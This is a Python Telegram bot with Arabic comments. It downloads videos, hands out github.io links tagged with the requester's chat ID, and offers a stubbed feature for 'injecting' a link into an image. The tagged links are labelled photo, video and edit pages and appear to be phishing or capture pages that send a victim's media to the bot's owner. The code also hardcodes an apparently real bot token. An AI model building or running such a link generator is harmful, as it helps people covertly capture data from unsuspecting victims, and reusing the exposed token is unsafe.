import os
import json
import urllib3
import telebot
from telebot import types
from PIL import Image, PngImagePlugin
import threading
import http.server
import time
import yt_dlp

# إيقاف التحذيرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعداد التوكن من المتغيرات البيئية
BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

# المسارات
DB_FILE = "/tmp/voice_db.json"
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}
user_data = {}

# --- السيرفر الوهمي ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

# --- وظائف قاعدة البيانات ---
def load_db():
    if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
        return {"girl_1": {}, "girl_2": {}}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: return json.load(f)
        except: return {"girl_1": {}, "girl_2": {}}

def save_db(db):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(db, f, indent=4, ensure_ascii=False)

# --- دالة تحميل الفيديو ---
def download_video_sync(url, chat_id):
    try:
        ydl_opts = {'format': 'best[ext=mp4]/best', 'outtmpl': f'/tmp/vid_{chat_id}.mp4', 'quiet': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            return f"/tmp/vid_{chat_id}.mp4", info.get('title', 'Video')
    except Exception as e: return None, str(e)

# --- القوائم ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 الصوتيات", callback_data="voice_menu")
    )
    return markup

# --- معالجة الأوامر والرسائل ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "مرحباً بك يا سيف في البوت الشامل:", reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    if call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("أرسل رابط الفيديو الآن:", chat_id, call.message.message_id)
    elif call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.send_message(chat_id, "أرسل الصورة لحقن الرابط:")
    elif call.data == "get_photo_link":
        bot.send_message(chat_id, f"{PHOTO_PAGE_URL}?chatId={chat_id}")
    # ... (يمكنك إضافة باقي أزرار الصوتيات بنفس النمط هنا) ...
    bot.answer_callback_query(call.id)

@bot.message_handler(content_types=['photo', 'text', 'voice'])
def handle_media(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    if state == "waiting_for_url":
        bot.reply_to(message, "⏳ جاري التحميل...")
        path, title = download_video_sync(message.text, chat_id)
        if path:
            bot.send_video(chat_id, open(path, 'rb'), caption=title)
            os.remove(path)
        else: bot.reply_to(message, f"❌ خطأ: {title}")
        user_states[chat_id] = None
    elif state == "waiting_for_image_inject" and message.photo:
        # (منطق حقن الصورة هنا كما في كودك الأصلي)
        pass

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.polling(none_stop=True)
